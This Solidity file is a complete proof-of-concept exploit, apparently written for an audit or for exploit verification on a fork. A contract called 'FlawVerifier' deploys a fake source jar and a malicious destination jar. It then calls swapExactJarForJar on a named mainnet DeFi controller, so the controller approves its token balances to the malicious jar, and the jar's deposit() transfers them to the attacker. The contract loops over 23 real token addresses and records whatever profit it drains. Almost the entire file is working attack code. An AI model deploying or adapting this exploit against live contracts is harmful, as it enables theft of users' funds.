pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IControllerV4Like {
    function swapExactJarForJar(
        address _fromJar,
        address _toJar,
        uint256 _fromJarAmount,
        uint256 _toJarMinAmount,
        address payable[] calldata _targets,
        bytes[] calldata _data
    ) external returns (uint256);

    function jars(address token) external view returns (address);
}

interface IJarLike is IERC20Like {
    function token() external view returns (address);
    function getRatio() external view returns (uint256);
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function decimals() external view returns (uint8);
}

contract FakeFromJar is IJarLike {
    address public underlying = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    function setUnderlying(address newUnderlying) external {
        underlying = newUnderlying;
    }

    function token() external view returns (address) {
        return underlying;
    }

    function getRatio() external pure returns (uint256) {
        return 1e18;
    }

    function deposit(uint256) external {}

    function withdraw(uint256) external {}

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }
}

contract MaliciousToJar is IJarLike {
    address public targetToken = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public immutable thief;

    constructor(address _thief) {
        thief = _thief;
    }

    function setTargetToken(address newTargetToken) external {
        targetToken = newTargetToken;
    }

    function token() external view returns (address) {
        return targetToken;
    }

    function getRatio() external pure returns (uint256) {
        return 1e18;
    }

    function deposit(uint256 amount) external {
        if (amount == 0) {
            return;
        }

        _callOptionalBool(
            targetToken,
            abi.encodeWithSelector(IERC20Like.transferFrom.selector, msg.sender, thief, amount)
        );
    }

    function withdraw(uint256) external {}

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function _callOptionalBool(address target, bytes memory callData) internal {
        (bool success, bytes memory data) = target.call(callData);
        require(success && (data.length == 0 || abi.decode(data, (bool))), "MALICIOUS_PULL_FAILED");
    }
}

contract FlawVerifier {
    address public constant TARGET = 0x6847259b2B3A4c17e7c43C54409810aF48bA5210;

    address public constant PICKLE = 0x429881672B9AE42b8EbA0E26cD9C73711b891Ca5;
    address public constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address public constant SUSD = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
    address public constant THREECRV = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address public constant SCRV = 0xC25a3A3b969415c80451098fa907EC722572917F;
    address public constant RENBTC = 0xEB4C2781e4ebA804CE9a9803C67d0893436bB27D;
    address public constant RENCRV = 0x49849C98ae39Fff122806C06791Fa73784FB3675;
    address public constant CDAI = 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643;
    address public constant CETH = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;
    address public constant COMP = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    address public constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address public constant SNX = 0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F;
    address public constant CYFI = 0xFa3472f7319477c9bFEcdD66E4B948569E7621b9;

    address public constant UNI_WETH_DAI = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
    address public constant UNI_WETH_USDC = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address public constant UNI_WETH_USDT = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
    address public constant UNI_WETH_WBTC = 0xBb2b8038a1640196FbE3e38816F3e67Cba72D940;
    address public constant SUSD_CURVE_LP = 0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;
    address public constant THREECRV_GAUGE = 0xbFcF63294aD7105dEa65aA58F8AE5BE2D9d0952A;
    address public constant RENCRV_GAUGE = 0xB1F2cdeC61db658F091671F5f199635aEF202CAC;
    address public constant SUSD_GAUGE = 0xA90996896660DEcC6E997655E065b23788857849;

    IControllerV4Like internal constant CONTROLLER = IControllerV4Like(TARGET);

    FakeFromJar internal immutable fakeFromJar;
    MaliciousToJar internal immutable maliciousToJar;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {
        fakeFromJar = new FakeFromJar();
        maliciousToJar = new MaliciousToJar(address(this));
    }

    function executeOnOpportunity() external {
        if (_profitAmount != 0) {
            return;
        }

        _attemptFakeJarControllerDrain();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptFakeJarControllerDrain() internal {
        address payable[] memory targets = new address payable[](0);
        bytes[] memory payloads = new bytes[](0);

        uint256 baseCount = _baseCandidateCount();
        for (uint256 i = 0; i < baseCount; i++) {
            address token = _baseCandidateAt(i);
            if (_tryDrainToken(token, targets, payloads)) {
                return;
            }

            address jar = _safeJarForToken(token);
            if (_tryDrainToken(jar, targets, payloads)) {
                return;
            }
        }
    }

    function _tryDrainToken(
        address token,
        address payable[] memory targets,
        bytes[] memory payloads
    ) internal returns (bool) {
        if (token == address(0) || token.code.length == 0) {
            return false;
        }

        uint256 controllerBal = _safeBalanceOf(token, TARGET);
        if (controllerBal == 0) {
            return false;
        }

        uint256 beforeBal = _safeBalanceOf(token, address(this));
        fakeFromJar.setUnderlying(token);
        maliciousToJar.setTargetToken(token);

        // F-001 path used here:
        // swapExactJarForJar() trusts attacker-controlled jar metadata and never
        // verifies that _fromJar/_toJar are protocol jars. With a fake from-jar and
        // a malicious to-jar, the controller approves its entire balance of any
        // controller-held ERC20 to the malicious jar and the jar steals it in deposit().
        //
        // The fork used by this verifier may hold dust as raw want/reward tokens or as
        // protocol jar share tokens, so the scan includes both known protocol assets and
        // controller.jars(asset) outputs.
        try CONTROLLER.swapExactJarForJar(address(fakeFromJar), address(maliciousToJar), 0, 0, targets, payloads) {
            uint256 afterBal = _safeBalanceOf(token, address(this));
            if (afterBal > beforeBal) {
                _profitToken = token;
                _profitAmount = afterBal - beforeBal;
                return true;
            }
        } catch {}

        return false;
    }

    function _safeJarForToken(address token) internal view returns (address jar) {
        if (token == address(0) || token.code.length == 0) {
            return address(0);
        }

        try CONTROLLER.jars(token) returns (address value) {
            jar = value;
        } catch {}
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 amount) {
        if (token == address(0) || token.code.length == 0) {
            return 0;
        }

        (bool success, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (success && data.length >= 32) {
            amount = abi.decode(data, (uint256));
        }
    }

    function _baseCandidateCount() internal pure returns (uint256) {
        return 23;
    }

    function _baseCandidateAt(uint256 index) internal pure returns (address) {
        if (index == 0) return PICKLE;
        if (index == 1) return UNI;
        if (index == 2) return DAI;
        if (index == 3) return USDC;
        if (index == 4) return USDT;
        if (index == 5) return WETH;
        if (index == 6) return WBTC;
        if (index == 7) return SUSD;
        if (index == 8) return THREECRV;
        if (index == 9) return SCRV;
        if (index == 10) return RENBTC;
        if (index == 11) return RENCRV;
        if (index == 12) return CDAI;
        if (index == 13) return CETH;
        if (index == 14) return COMP;
        if (index == 15) return CRV;
        if (index == 16) return SNX;
        if (index == 17) return CYFI;
        if (index == 18) return UNI_WETH_DAI;
        if (index == 19) return UNI_WETH_USDC;
        if (index == 20) return UNI_WETH_USDT;
        if (index == 21) return UNI_WETH_WBTC;
        if (index == 22) return SUSD_CURVE_LP;
        revert("BAD_INDEX");
    }
}
